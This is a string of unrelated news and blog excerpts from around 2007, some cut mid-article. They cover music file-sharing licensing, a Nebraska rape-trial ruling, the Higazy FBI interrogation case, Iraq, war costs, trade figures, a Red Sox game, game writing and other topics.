That would ensure that the labels are fairly compensated for their music while simultaneously preserving the free flow of information that is the hallmark of a modern university .
As EFF points out , there is ample precedent for such an arrangement , including blanket licenses universities already pay for a cappella music performances and software .
There are also collective licensing organizations that collect hundreds of millions of dollars in royalties every year on behalf of composers .
And EFF 's proposal does n't require any action from Congress ; many existing collective licensing authorities are private organizations whose members have joined voluntarily .
College campuses are an ideal place to experiment with collective licensing arrangements .
There would be little downside for the labels because illicit file - sharing rates are already high among college students .
And colleges already have existing payment infrastructure in place that would make it easy to collect fees from students .
Perhaps best of all , if the experiment proves successful , it would create demand for similar deals in the " real world " as college students graduate .
In a couple of years , the RIAA might begin selling similar blanket licenses directly to students or perhaps to the ISPs .
Universities should speak out
Instead , the recording industry seems determined to draft universities into the role of copyright cops , forcing schools to snoop on their students ' online activities and assist in the prosecution of their own customers .
Fortunately , colleges and universities have substantial lobbying clout of their own , and so far they 've successfully resisted efforts to single them out for special treatment .
But it would be better for the universities to plot an affirmative strategy of their own .
EFF 's collective licensing proposal is a promising model .
Instead of acquiescing to the recording industry 's ever - escalating demands , universities should band together and refuse to do more than the legally - required minimum to assist the recording industry unless the labels reciprocate by exploring alternative compensation models .
If the labels insist on a lawsuit - only strategy , universities should use their substantial soapbox to highlight the inequities of the RIAA 's lawsuit campaign .
To be sure , it 's hard to have sympathies for those who knowingly flout the law .
But the RIAA does make mistakes in its choice of targets , and when it does so , the defendants have little opportunity to defend themselves ; hiring the necessary legal counsel can cost more than the settlement amount .
Moreover , the lawsuit campaign is consuming enormous court resources with little apparent deterrent .
We would all be better off with a means of compensating artists that did n't involve tens of thousands of lawsuits .
It 's also becoming clear that the universities ' strategy of appeasement has n't been working very well .
Spending millions of dollars on anti-piracy seminars , heightened penalties , and legit music services like Ruckus and Rhapsody has not dissuaded the recording industry from asking Congress to mandate still further assistance .
The defensive posture universities have adopted so far has only encouraged the labels to make still further demands .
Instead , universities should go on offense , using the substantial prestige of higher education to develop and promote less litigious solutions to the file - sharing problem .
Further reading
Even though the federal lawsuit filed by Tory Bowen 's attorneys was dismissed , it looks like some of the findings in that lawsuit did make a difference .
Officially , the change is a " clarification " that while he still bans the word rape , he no longer bans her from saying " sexual assault . "
The defense attorney claims this is n't a change at all , but I do n't believe that .
From the Omaha World Herald :
[ Judge ]
Cheuvront 's written order was dated Sept. 27 , two days after a federal judge said he would not " stick his nose " into the state court case but saw no reason for banning use of the word rape .
" For the life of me , I do not understand why a judge would tell an alleged rape victim that she cannot say she was ' raped ' when she testifies in a trial about rape , " wrote U.S. District Judge Richard Kopf on Sept. 25 .
" Juries are n't stupid . "
Judge Cheuvront provides the answer and that answer is deeply troubling .
Cheuvront wrote that the case was solely about consent , or the lack thereof , and that there was no evidence of force or the threat of force .
" Because of the nature of this particular case , this court concludes that the use of the possible inflammatory term ' rape ' is unduly prejudicial and unnecessary , particularly when the equally descriptive term of ' sexual assault , ' as set forth in the Nebraska statutes , could be used , " the judge said .
To me that means that this judge has ruled that in Nebraska if you have sex with an unconscious person , including someone in a coma , that it cannot possibly be classified as rape because no force is used .
This is a very dangerous message to send .
This judge is in effect making the ruling that Tory Bowen could n't have been raped and that 's the real reason why he 's banning her from describing what happened to her as rape and not because the word " rape " would unduly prejudice the jury .

While most pen designs are getting more complex , this inkless metal pen takes inspiration from the past for its simple design and functionality .
Though not likely to usurp the ballpoint , the novel pen made from stainless steel contains no ink yet is able to write on any most types of paper without ever needing a refill .
The metal pen takes its inspiration from medieval times when artists and scribes often used a metal stylus in order to draw on a specially prepared paper surface .
The material the pen was made from was a sign of the status of the scribe ’s employer .
Gold and silver were used by the upper classes and lead by the less wealthy .
This type of pen was commonly known as Metalpoint , or Silverpoint when the stylus was made of silver .
Artists such as Leonardo da Vinci used them .
This solid metal ' nib ' of this particular metal pen is made from metal alloy rather than silver .
It leaves a mark on most types of paper and works best on standard copier / printer paper .
The mark it leaves looks like that of a pencil however it can not be erased .
I would n’t use it to try and write the great American novel , but it ’s definitely a handy implement to have around and not worry about whether your pen has run out of ink .
It could also be a help to " lefties " to help them avoid ink smudge .
The metal pen is available from Grand Illusions for US $ 29.98 , a long - term investment since there is no need to replace the ink or buy a new pen for at least 25 years .
UNITED NATIONS ( CNN ) -- Bolstered by Iraqi Prime Minister Nuri al - Maliki 's assurances that there 's been " substantial improvement " in security and stability in Iraq , the United Nations is considering boosting its presence in the country .
U.N. Secretary - General Ban Ki-moon , left , and Iraqi Prime Minister Nuri al - Maliki talk to reporters Saturday .
" The international community cannot turn away from or ignore Iraq , " U.N. Secretary - General Ban Ki-moon told reporters Saturday .
" The time for determined , collective action has come . "
He made the comments following high - level talks with foreign officials including U.S. Secretary of State Condoleezza Rice on the topic .
The increased presence would not only support national reconciliation in Iraq , but also promote diplomatic relations between the country and its neighbors , Ban said .
Watch Ban 's pledge of help to Iraq »
Al - Maliki requested additional U.N. support for his country , maintaining the security situation has improved enough for that to happen , although he admitted that pockets of tension -- and terrorism -- remain
Steps toward national reconciliation have also been taken , he said .
" We 're trying to build a culture of peace and security , but to make this possible , we 've stressed accountability and justice , " al - Maliki said .
The Iraqi prime minister , who is in New York for the U.N. General Assembly session , will meet with several top U.S. officials , including President Bush .
Flanked by Ban , he told reporters that 2007 was Iraq 's security year , and that he 's hoping 2008 will be " the economic year . "
Ban agreed that security in Iraq is improving , but added , " much more has to be done . "
The security situation will have direct bearing on an increased U.N. presence , he said .
The number of U.N. staffers in Iraq will increase as soon as measures are in place to ensure their safety , Ban said .
One option under consideration is putting staffers in Basra , where British troops recently decreased their presence , he said .
Another is establishing a support office in Baghdad to help smooth the coordination between Iraq and its neighbors .
Those plans will be finalized later , possibly at a meeting in Istanbul next month , Ban said .
The U.N. Security Council last month unanimously passed a resolution that expanded the mandate of its mission in Iraq .
Resolution 1770 was hailed as a new phase of the U.N. Assistance Mission for Iraq , or UNAMI .
The resolution says the U.N. seeks to " foster regional dialogue " on matters such as " border security , energy and refugees . "
It also says the U.N. will work with Iraqis to " resolve disputed internal boundaries " and promote discussion on national reconciliation .
The United Nations has had a limited role in the country and greatly scaled down its activities after two bombings four years ago at its Baghdad headquarters , including one that killed 22 people .

A federal appeals court has concluded that an FBI agent must go to trial on charges he coerced a false confession out of a prime suspect in the 9/11 attacks .
But the FBI still insists that its agent did nothing wrong .
And the feds swayed the court to suppress that portion of a recent decision detailing how the FBI agent used the threat of torture to break an innocent man .
Abdallah Higazy , a 30 - year - old Egyptian student , arrived in New York City to study engineering at the Polytechnic University in Brooklyn on August 27 , 2001 .
A U.S. foreign - aid program reserved and paid for his room at the Millennium Hilton Hotel , next to the World Trade Center .
After the first plane crashed into the World Trade Center , Higazy hot - footed it out of the hotel .
After the terrorist attack , the hotel was sealed .
Three months later , guests were allowed to retrieve their belongings .
When Higazy went to the hotel on December 17 , he was arrested and accused of possessing an aviation radio .
( A hotel security guard reported finding the radio in a safe in his room . )
Higazy denied owning the radio .
He was arrested as a material witness and locked up in solitary confinement .
Higazy wanted to clear his name so he agreed to take a polygraph test .
FBI agent Michael Templeton wired him up for the test but then proceeded to browbeat him for three hours until he finally admitted to owning the radio .
Higazy said the FBI agent warned him ,  If you do n’t cooperate with us , the FBI will … make sure Egyptian security gives your family hell .
The FBI refused to permit Higazy ’s attorney , Robert Dunn , to be in the room while he was given the polygraph .
After the interrogation , Higazy was trembling and sobbing uncontrollably ,  according to Dunn .
On January 11 , 2002 , Higazy was indicted for lying to a federal agent .
U.S. Attorney Dan Himmelfarb declaimed that  the crime that was being investigated when the false statements [ about the radio ] were made is perhaps the most serious in the country ’s history .
A radio that can be used for air - to - air and air - to - ground communication is a significant part of that investigation . 
The Washington Post noted that federal officials paraded [ Higazy ] before the media as a terrorist .
The feds never bothered checking with the U.S. foreign - aid program to find out whether Higazy ’s story about why he was staying at the hotel next to the World Trade Center was true .
The prosecutorial celebration flopped three days later when an American pilot showed up at the Millennium Hilton Hotel and asked for the aviation radio he had left in his room when the hotel was evacuated on 9/11 .
It soon became apparent that the hotel security guard ( a former cop who had been fired by the Newark Police Department ) had lied about finding the radio in Higazy ’s room .
The case collapsed and , a few days later , Higazy was awarded $ 3 for subway fare and released from jail .
The FBI conducted an internal investigation and absolved Templeton of any wrongdoing .
In late 2002 Higazy sued , asserting that the FBI ’s coercive interrogation violated his Fifth Amendment rights against self - incrimination .
Federal judge Naomi Buchwald dismissed his case , declaring ,  [ Agent ]
Templeton ’s conduct and threats as a matter of law cannot be classified as conscience - shocking or constitutionally oppressive .
Perhaps Buchwald believed that as long as Higazy ’s mother and sister were not brutalized in front of him during the interrogation , the FBI had done nothing wrong .
A federal appeals court overturned this decision on October 19 , declaring that Higazy ’s case deserved to go to trial .
The original version of the decision detailed the tactics Templeton purportedly used to get Higazy ’s confession .
Two hours later , the court removed that portion of the decision from the Internet .
The redacted portion of the decision ( captured by bloggers before it was taken down ) noted that the FBI agent admitted to knowing that Egyptian laws are different than ours , that they are probably allowed to do things in that country … yeah , probably about torture , sure . 
Thus , Templeton was aware that his threat would terrify Higazy .
The revised court decision replaced such key details with the following mundane notice :  For the purposes of the summary judgment motion , Templeton did not contest that Higazy ’s statements were coerced . 
The FBI has long taught its agents that subjects of their investigation have forfeited their right to the truth ,  according to the ethics study guide at the FBI Academy .
Perhaps , according to federal lawmen , it is a small step from lying to suspects to threatening to have their kinfolk tortured .
The agency has done nothing in the nearly six years since this case began to indicate that the methods used in the Higazy case did not receive the full approval of FBI headquarters .
The initial Higazy arrest and release were landmarks showing how far feds would go to gin up evidence and headlines for the war on terror .
The fact that the FBI approved of its agent ’s methods  and the fact that a federal judge saw no problem with the interrogation  are further warning signs of constitutional decay .
Keep your eyes on this case , because it could help determine how far feds can go to destroy innocent people .
The Best of James Bovard
The diamond is expected to attract furious bidding from buyers worldwide and could fetch up to £ 15 m .
A spokesman for the mining house which made yesterday 's find , Brett Joli , said the diamond was being rushed to a bank vault in Johannesburg and would be kept there for a couple of days " until we calm down and decide what we are going to do " .
A security company was being hired to protect the precious stone .
The mining company which made the find has not been identified .
The South Africa Broadcasting Corporation said the stone was said to be twice the size of the Cullinan diamond .
Fred Cuellar , the founder of Diamond Cutters International and author of How to Buy a Diamond , said he first heard about the find a few days ago .
" I get a phone call when any rare stone around the world is found and when I heard about this one it was stunning news .
" It caught everybody in the diamond industry offside .
There will be a lot of mad bidding from a lot of private individuals as to who is going to buy this stone . "
The Cullinan , which was found near Pretoria more than a century ago , was until recently acknowledged to be the largest cut diamond in the world , weighing in at 530.20 carats .
In 1985 it lost the record to the Golden Jubilee , which was found in the same mine as the Cullinan and weighed 545.67 carats .
In its rough state the Cullinan weighed 3,106.75 carats .
It now forms part of King Edward 's sceptre and is in the Tower of London .
The Cartier diamond , famous as a gift from Richard Burton to Elizabeth Taylor , weighed a mere 240.80 carats rough and 69.42 carats cut .
Mr Cuellar said the most important information about the latest find was yet to be forthcoming , including whether it is colourless .
" The reported size of the stone is accurate , but there are all these other factors we still do n't know and what matters now is how wide , how clear and how well cut it will be .
" Will this diamond rank above the best quality diamonds in the world ?
I can tell you right now , no .
But in as far as the list of the largest diamonds ever found in the world goes , would it make that list ?
Yes it would . "
He said the first seven people who looked at the stone thought it was industrial grade , but that view has changed and it now appears to be a stone that will be cut into a piece of jewellery .
The quandary facing the owner of the diamond now is how best to cut the stone he said .
" The thinking usually is with these types of things , we know how big we could get it but we do n't know how much it will hurt us on the quality side . "
The Cullinan , also known as the Star of Africa , was thought by some to be part of a larger stone which still lies somewhere undiscovered .
There will be interest in who made the find and how they will be rewarded .
The black miner who discovered the Excelsior , said to be the second largest uncut diamond ever found , received a horse and saddle , and a sum of money .
Rock stars
· The Cullinan Diamond was discovered in 1905 and at 3,106 carats was the largest gem-quality rough diamond ever found .
Cullinan I , or the Great Star of Africa - at 530 carats formerly the largest cut diamond - was one of the 105 gems cut from it .
· The Koh - i - noor is part of the British crown jewels .
It originated in India but seized by Britain as a spoil of war in 1849 .
The diamond supposedly brings good luck to female owners and misfortune or death to any male who wears or owns it .
· The Hope Diamond is a large ( 45.52 carat ) , deep blue diamond .
It is legendary for the curse it supposedly puts on whoever possesses it .
Previous owners include Kings Louis XV and XVI and Marie Antoinette .
WASHINGTON ( Reuters Life ! ) - Despite President George W. Bush ’s campaign to improve the United States ’ image in Latin America , very few Americans seem to know what is going on in the region , a new poll showed .
Brazilian President Luiz Inacio Lula da Silva after he was sworn in for a second term of office in Brasilia , January 1 , 2007 .
Despite President Bush 's campaign to improve the United States ' image in Latin America , very few Americans seem to know what is going on in the region , a new poll showed .
REUTERS / Jamil Bittar
A recent Zogby International poll showed that the large majority of Americans did not know the names of the presidents of Brazil and Mexico , the two biggest economies in the region .
Only 10 percent of the 7,362 adults interviewed were familiar with Brazil ’s second term president , Luiz Inacio Lula da Silva , and just 20 percent knew of Mexican President Felipe Calderon .
“ In part this reflects the fact that Americans do n’t pay much attention to foreign affairs generally , ” said Peter Hakim of the Inter - American Dialogue , a Washington think tank which was involved in the poll .
“ If you ask them who the president of Pakistan or Iraq is , they probably might not know , ” he added .
Bush visited five Latin American countries in March in an effort to boost U.S. influence in a region that elected several left - wing leaders in recent years .
The poll showed that just one in four Americans approve of Bush ’s handling of U.S. relations with Latin America , but 60 percent said his administration has done poorly .
Three of the four free trade deals waiting for approval in the U.S. Congress are with Latin American countries -- Peru , Panama and Colombia .
The Zogby poll showed that about 48 percent of Americans think the United States should have more trade agreements with Latin America while one in three were opposed .
Brazil , Mexico and Costa Rica appeared as the closest allies of the United States .
Venezuela and Cuba topped the list of the least friendly , followed by Colombia , which is in fact a firm ally .
More than half those polled said the United States should be talking to the Cuban government , which for decades has been its fiercest rival in the region , and 56 percent said the increasing influence of communist China in Latin America is a serious threat to U.S. influence .
The online poll was conducted between July 27 and 30th and has a margin of error of 1.2 percentage points .
The Upper East Side ’s beloved hawk , Pale Male , was the target of a cruel attack yesterday when a construction worker pummeled him with rocks – and now bird lovers are fearing for Pale Male ’s life .
The famous fowl was struck and likely wounded with at least one thrown object in an incident that one steamed cop called “ a crime against nature . ”
Witnesses said the bird was perched on a piece of masonry on an upper floor of 1040 Fifth Avenue at E. 85th St. at 3 p.m. when the worker , standing on the roof above , started chucking rocks at him .
After he was hit , Pale Male , whose many trials and tribulations have captivated the city over the past few years , stayed on the ledge .
“ I ca n’t tell how he ’s doing , ” said Lincoln Karim , a video engineer who has long chronicled Pale Male ’s exploits .
His bird “ wife ” Lola was not at the scene at the time of the sickening attack .
A spokesman for the construction company said , “ We are here just to cooperate with the authorities , ” adding that the worker had been fired .
Karim was on hand to witness and photograph the attack .
Afterward , he alerted cops and attempted to have the rock - thrower , identified by sources as Antonio Torrado , busted .
“ I usually look for the red - tailed hawk [ Pale Male ] in this area and when I looked up the building , these two construction workers were very close to the bird , ” Karim told The Post .
“ Next thing I see , they are throwing rocks at the bird .
This is a federally protected bird and this person should be arrested . ”
Police made no arrests .
“ We are going to investigate and possibly an arrest will be made , ” said Sgt. Chris Vaber of the NYPD ’s Central Park Bureau .
Pale Male soared into the nation ’s consciousness when the co-op board at a posh Fifth Avenue building tried to eradicate his nest after a campaign by one resident , CNN anchor Paula Zahn ’s husband , Richard Cohen .
After a public outcry , the building allowed Pale Male and his mate Lola to return .
COMPARING U.S. WARS COMPARING U.S. WARS

Facebook WASHINGTON 
The cost of the wars in Iraq and Afghanistan could total $ 2.4 trillion through the next decade , or nearly $ 8,000 per man , woman and child in the country , according to a Congressional Budget Office estimate scheduled for release Wednesday .
A previous CBO estimate put the wars ' costs at more than $ 1.6 trillion .
This one adds $ 705 billion in interest , taking into account that the conflicts are being funded with borrowed money .
The new estimate also includes President Bush 's request Monday for another $ 46 billion in war funding , said Rep. John Spratt , D - S.C. , budget committee chairman , who provided the CBO 's new numbers to USA TODAY .
Assuming that Iraq accounts for about 80 % of that total , the Iraq war would cost $ 1.9 trillion , including $ 564 billion in interest , said Thomas Kahn , Spratt 's staff director .
The committee holds a hearing on war costs this morning .
" The number is so big , it boggles the mind , " said Rep. Rahm Emanuel , D - Ill .
Sean Kevelighan , a spokesman for the White House budget office , said , " Congress should stop playing politics with our troops by trying to artificially inflate war funding levels . "
He declined to provide a White House estimate .
The CBO estimates assume that 75,000 troops will remain in both countries through 2017 , including roughly 50,000 in Iraq .
That is a " very speculative " projection , though it 's not entirely unreasonable , said Loren Thompson , a defense analyst at the non-partisan Lexington Institute .
As of Sept. 30 , the two wars have cost $ 604 billion , the CBO says .
Adjusted for inflation , that is higher than the costs of the Korea and Vietnam conflicts , according to the Washington - based Center for Strategic and Budgetary Assessments .
Defense spending during those two wars accounted for a far larger share of the American economy .
In the months before the March 2003 Iraq invasion , the Bush administration estimated the Iraq war would cost no more than $ 50 billion .

NEW YORK ( CNNMoney.com ) --
The gap between imports and exports narrowed slightly in July despite a jump in imports from China , an increase that made that nation the No. 1 source of U.S. imports .
The gap was $ 59.2 billion in July , down from the revised $ 59.4 billion in June , according to the Commerce Department .
Economists surveyed by Briefing.com had forecast a $ 59 billion trade deficit .
The U.S. trade gap narrowed despite a jump in Chinese imports in July .
The trade gap with China rose 12.5 percent from June levels and 21.6 percent from the year - earlier period to $ 23.8 billion .
Chinese imports moved ahead of those from Canada with this report .
Chinese goods shipped here had only narrowly trailed Canadian imports in the June report , and in July they were well ahead , $ 28.6 billion compared to $ 24.5 billion .
The Canadian imports have rarely become a major trade issue here because of far greater balance in goods across the border .
In fact , Canada is the largest market for U.S. exports , buying $ 18.8 billion in U.S. - made goods in the July report , for a gap of only $ 5.7 billion .
China , despite its size and rapid growth , bought only $ 4.8 billion of U.S. goods in July .
The only better market for U.S. goods are the nations of the European Union as a group , which bought $ 18.9 billion in U.S. exports while selling $ 31.9 billion in exports to the United States as a group .
But no European country by itself was anywhere near the level of Chinese goods shipped here .
The trade gap of goods to and from China now accounts for 40.2 percent of the nation 's overall trade gap , up from 35.6 percent in June and 29 percent a year ago .
The trade gap also is drawing greater attention due to concerns about the safety of Chinese imports .
Toymaker Mattel ( Charts , Fortune 500 ) has had three major recalls of Chinese - made toys since Aug. 1 , and Congress is holding hearings Wednesday and next week on the issue .
In addition , Walt Disney Co. ( Charts , Fortune 500 ) has announced a testing program for toys it licenses coming in from China , as has retailer Toys R Us .
There have also been recalls of in recent months of Chinese - produced toothpaste , seafood , animal feed , tires and car fuses , all due to concerns about the safety of the products .
Higher oil prices also put pressure on the U.S. trade gap , as the average price of a barrel of imported oil in the month was up 7.6 percent to $ 65.56 , the highest average price since August 2006 .
But a drop in the volume of oil exports meant that the part of the trade gap attributed to petroleum increased only 2.3 percent from June .
That was more than balanced off by a 3 percent drop in the gap attributed to non-petroleum trade .
In fact the part of the trade gap attributed to petroleum - $ 24 billion - is only slightly ahead of the part of the gap attributed to trade of goods with China .
Not Reasons I am an Atheist
Many people assume they know why I am an atheist , and that in part is why I chose to start blogging about my beliefs .
I would like to address many of the common misconceptions about my atheism up front so that they are out of the way now .
First of all , I am not angry with God .
No event or events caused me to turn away from religion .
I have had , and am having a wonderful life .
I have a loving family .
I have not lost a loved one to a tragic accident .
Simply put , I love living and cannot wait for the next day .
I am not influenced by the devil or motivated to do evil things .
I do not believe in the devil .
In fact , I find the idea one of Christianitys most silly .
I do not want to do evil .
In fact , I have dedicated a significant portion of my life to trying to become a better person by finding a belief system that aids me in making ethical decisions .
I have not had a bad experience at church .
I have never attended church regularly , but I have had the opportunity to attend a variety of denominations services .
I have found every trip to church to be a pleasant experience .
People have always been warm and welcoming at the churches I attended .
Most sermons I have had the privilege to hear have been insightful and have contained valuable advice .
But , none of that changes the fact that the foundation on which the temple of religion rests is cracked and faulty .
The beautiful ornamentation built atop this temple is destined to end up in an ugly heap when foundation finally gives way .
Anyone that uses the temple foundation as a foundation in his or her own life runs the exact same risk .
I am not disillusioned by religious leaders .
I find that religious leaders are very similar to the rest of us .
Most people of the cloth are intrinsically good , and there are exceptionally fine examples of humanity to be found among their ranks .
Perhaps , there are more good and exceptionally good people in positions of religious leadership then in the rest of society .
Unfortunately , there are also bad people and the occasional exceptionally bad person .
The recent rash of priest pedophiles comes to mind , but that is a topic for a later blog .
The point is that I dont hold religion responsible for its leaders .
While I think religion can misguide good people into doing bad things , I dont believe that most religious leaders are intentionally immoral .
They are good people that have been misguided by a faulty system of determining right and wrong .
Again , I think of the priest pedophiles and the archdiocese that enabled them for decades to continue to abuse children , but we will get to that later .
I am not an atheist because I do not understand love .
I am married to a wonderful woman .
I love her with all my heart .
I want children .
I have two dogs that show me unconditional love every moment of every day .
Is there a love more pure than that of a dog for his owner ?
I am not an atheist because I am attempting to be different or draw attention to myself .
Personal religious belief is just that , personal .
It has been painful for members of my family to discover that I am an atheist .
I do not wish them pain in any form .
In fact , in instances where I believe that the knowledge of my atheism would cause undo pain , I have chosen to keep my beliefs private .
I write this blog not to draw attention to myself , but rather in order to help people .
Most importantly , this blog is an attempt to explain to my family and friends why I believe what I do .
Some of them have difficulty understanding my point of view , and others just want to understand me better as a person .
It is my sincere hope that my attempt at explaining how I see the world will allow us to become closer as a result .
This blog is also an attempt help those that have doubts about religion themselves .
In my short time as an atheist I have met many people that feel the same way that I do , but they have either not taken the time to understand their own feelings , have been afraid to talk about their feelings , have thought that they were the only ones that felt the way they did , have not known where to turn to learn more , and did not know that there are alternative belief systems available that allow a person to be moral and godless at the same time .
I have also met people that have simply never thought to doubt the religious messages they have been taught their whole lives .
( Perhaps because they were instructed by religious leaders that to doubt and question is a sin worthy of eternal torture ? )
More than once , this type of person has been receptive and thankful for some non-threatening , intellectual discussion on the topic of religion .
It can be a great comfort to find out that you are not alone in how you think , and that it is possible to be a good person and not have religion .
I owe much to those that have come before me .
I take great comfort in knowing that I am not alone and that there are strong , intelligent people that feel as I do .
If I can help someone the way that I was helped , the effort will be worth every second I spent writing .
In a world without God , this life and those we spend it with are all we have , and that is more than enough to be a happy , peaceful , contented , loving person .
It is amazing how happy you can be when you choose to devote your time and effort to being happy in this life .
How to Write an FPS
While later installments have improved on the plot , the original Quake had no discernable storyline
The Half - Life series has been especially celebrated for its story - driven action and focus on character
If you ask a gamer to chart the rise of first person shooters from conception of the genre to their current state in the modern world in as few games as possible , say three titles , then you 'll always hear the same games listed .
Want to prove me wrong ?
Think of them now before reading the next paragraph .
Right ; you chose ( orif you 're a bit younger ) , and then ( One or two , it 's a matter of personal preference ) if we 're listing them in chronological order .
Even if I am miles off ( rare , but possible ) then you 'd have to admit that it's hard to argue with that selection of games .
Now , it may just be me , but the first thing that stands out about those games above is that , apart from , none of them have very interesting storylines .
That may be a bold statement , but deep down we all know that neithernor the originalwere built with a clear plot in mind – both of them had a story tacked on at the end purely to give some context to the violence .
There can be no other explanation for the awful Shub - Niggurath boss at the end of There 's nothing wrong with that of course , back in the daywas amazing in its own , essentially plotless , right .
But it 's interesting that only recently has a push for coherently told storylines appeared among FPS fans , bought on by another few years of maturity in what is an undeniably young medium .
Paintings and music have both been around since time out of mind , but computer games have only been around for a couple of decades and only recently have they begun to be recognised for the artistic merit posed by their interactivity .
So , as part of a continuing feature , we 'll be exploring how stories are told in games in general and the different problems posed by genre choices .
In a nutshell , we 'll be trying to find out how writers are now working hand in hand with designers and artists to tell exciting stories and what difficulties they come across in the process to gain insight into how games are written .
We do n't chew our words here ateither , so we 'll be jumping straight in to have a look at the biggest and baddest genre out there ; the first - person shooter .
We 'll be looking at FPSes with Rob Yescombe , the screenwriter for Free Radical Design and Martin Lancaster , the main writer for .
Rob , who is currently hard at work putting the finishing touches to the upcoming PS3 and PC title , Haze is a veteran writer outside the games industry and he 'll be letting us know what it was like working with an established studio on a triple A title for the first time , while we subtly press him for details on the upcoming Martin Lancaster meanwhile is the core writer and game designer for Crytek and has worked there for a number of years , focusing at the moment on the impendingwhich is guaranteed to blow us all out of the water in awe when it hits shelves later this year .
So , without further ado , let ’s delve right in and see just what FPS games are capable of story - wise .
• Figure this :
Gagne gave up two hits , three walks and three earned runs after retiring the first two batters of the inning .
• Quotable : " I do n't know how to put it into words .
It 's just very frustrating . " -- Gagne
• Hero : Russ Adams drove in the go - ahead run with a two - run double .
• Hunt for October : Boston has lost three straight and had its lead in the AL East cut to 2½ games over New York after the Yankees ' 12 - 0 victory over the Orioles .
-- ESPN.com news services
Blue Jays 4 , Red Sox 3
TORONTO ( AP ) --
Once the best closer in baseball , Red Sox reliever Eric Gagne has suddenly become shaky .
So has Boston 's lead in the AL East .
Gagne allowed three eighth - inning runs , two of them on a double by Russ Adams , and the Toronto Blue Jays beat the Red Sox 4 - 3 on Tuesday night .
" I do n't know how to put it into words , " Gagne said .
" It 's just very frustrating . "
Boston has lost three straight and had its lead in the AL East cut to 2½ games over New York , after the Yankees ' 12 - 0 victory over Baltimore .
It 's the smallest Red Sox lead since before play on April 26 .
" I do n't think anybody is thinking about that , " second baseman Dustin Pedroia said .
" We need to play better than we have been . "
Gagne , who holds the major league record with 84 consecutive saves , has blown four saves since joining Boston from Texas in a July 31 trade .
All four games have ended as Red Sox losses .
" We 've had some weird games this past week , " catcher Jason Varitek said .
" Those things happen throughout a season .
You do n't want them to happen now but we need to focus on what we need to do to make things right . "
Red Sox manager Terry Francona said Gagne appeared to be overthrowing as the inning unraveled .
" It looked like he wanted to throw it through the backstop instead of remembering what makes him Gagne , " Francona said .
" He got a little revved up .
Johnny [ pitching coach John Farrell ] tried to go out and slow him down and it did n't end up very well . "
Boston led 2 - 1 in the eighth when Frank Thomas drew a two - out walk off Gagne ( 3 - 2 ) .
Thomas was replaced by pinch - runner Curtis Thigpen , and Aaron Hill singled and Matt Stairs walked before Gregg Zaun drew a five - pitch walk to tie the game .
" I felt good physically , " said Gagne , who was out with a sore shoulder from Aug. 27 to Sept. 10 .
" I walked Thomas and after that I did n't throw strikes . "
Gagne got in a brief argument with plate umpire Ed Rapuano , then gave up Adams ' double that barely cleared the outstretched arm of J.D.
Drew in right field .
Hill and Stairs scored but Zaun was thrown out at the plate , ending the inning .
" I was just being emotional out on the mound , frustrated at myself , " Gagne said .
Varitek was n't so diplomatic .
" He made some pitches that could go either way and he did n't get any of those calls , " Varitek said .
Even with closer Jonathan Papelbon warming in the bullpen , Francona chose to stick with Gagne .
" He had two quick outs , " Francona said .
" That 's his inning to get out of . "
A.J. Burnett came within one out of a complete game to win for the fourth time in eight starts since returning from the disabled list Aug. 12 , after missing 37 games with a sore shoulder .
He gave up three runs and nine hits , striking out 11 and walking three -- one intentional .
Burnett ( 9 - 7 ) started the ninth and got the first two outs before Julio Lugo homered to left .
Scott Downs came on to face Jacoby Ellsbury and got him looking for his first save .
The Blue Jays opened the scoring in the first on Alex Rios ' RBI double .
Thomas advanced Rios to third with a base hit , but he was thrown out at the plate on Hill 's fielder 's choice grounder .
Stairs loaded the bases with a walk , but Jon Lester struck out Zaun to escape the jam .
Lester clamped down after his shaky first , allowing just a walk to Rios in the third , a single to Zaun in the fourth and a walk to Hector Luna in the seventh .
He yielded one run and three hits in 6 2/3 innings , walked four and struck out five .
" He 's a maturing young pitcher , that 's for sure , " Francona said .
Manny Delcarmen replaced Lester and got Wells to fly out to end the seventh .
Boston tied it at 1 in the fourth on a two - out double by Varitek , then went ahead in the fifth on another two - out double , this one from David Ortiz .
The hit snapped an 0 - for - 9 slump for Ortiz , who is 1 - for - 8 with six strikeouts in his past two games .
Boston is still without outfielder Manny Ramirez , who has missed the past 20 games with a strained left oblique muscle .
" It 's not going away , " Francona said .
" He 's been working hard but it 's not there .
The running yesterday did n't go as well as he had hoped . "
Francona plans to give starters Daisuke Matsuzaka and Curt Schilling extra days off before their next starts as he tries to set his rotation for the playoffs .
Matsuzaka , working on three extra days ' rest , will go Saturday at Tampa Bay .
Schilling will go on four extra days ' rest against Oakland next Tuesday .

The Observer 's Foreign Affairs Editor attempts to unravel the truth behind Operation Orchard and allegations of nuclear subterfuge
The head of Israel 's airforce , Major - General Eliezer Shkedi , was visiting a base in the coastal city of Herziliya last week .
For the 50 - year - old general , also the head of Israel 's Iran Command , which would fight a war with Tehran if ordered , it was a morale - boosting affair , a meet - and - greet with pilots and navigators who had flown during last summer 's month - long war against Lebanon .
The journalists who had turned out in large numbers were there for another reason : to question Shkedi about a mysterious air raid that happened this month , codenamed ' Orchard ' , carried out deep in Syrian territory by his pilots .
Shkedi ignored all questions .
It set a pattern for the days to follow as he and Israel 's politicians and officials maintained a steely silence , even when the questions came from the visiting French Foreign Minister , Bernard Kouchner .
Those journalists who thought of reporting the story were discouraged by the threat of Israel 's military censor .
But the rumours were in circulation , not just in Israel but in Washington and elsewhere .
In the days that followed , the sketchy details of the raid were accompanied by contradictory claims even as US and British officials admitted knowledge of the raid .
The New York Times described the target of the raid as a nuclear site being run in collaboration with North Korean technicians .
Others reported that the jets had hit either a Hizbollah convoy , a missile facility or a terrorist camp .
Amid the confusion there were troubling details that chimed uncomfortably with the known facts .
Two detachable tanks from an Israeli fighter were found just over the Turkish border .
According to Turkish military sources , they belonged to a Raam F15I - the newest generation of Israeli long - range bomber , which has a combat range of over 2,000 km when equipped with the drop tanks .
This would enable them to reach targets in Iran , leading to speculation that it was an ' operation rehearsal ' for a raid on Tehran 's nuclear facilities .
Finally , however , at the week 's end , the first few tangible details were beginning to emerge about Operation Orchard from a source involved in the Israeli operation .
They were sketchy , but one thing was absolutely clear .
Far from being a minor incursion , the Israeli overflight of Syrian airspace through its ally , Turkey , was a far more major affair involving as many as eight aircraft , including Israel 's most ultra-modern F - 15s and F - 16s equipped with Maverick missiles and 500 lb bombs .
Flying among the Israeli fighters at great height , The Observer can reveal , was an ELINT - an electronic intelligence gathering aircraft .
What was becoming clear by this weekend amid much scepticism , largely from sources connected with the administration of President George Bush , was the nature of the allegation , if not the facts .
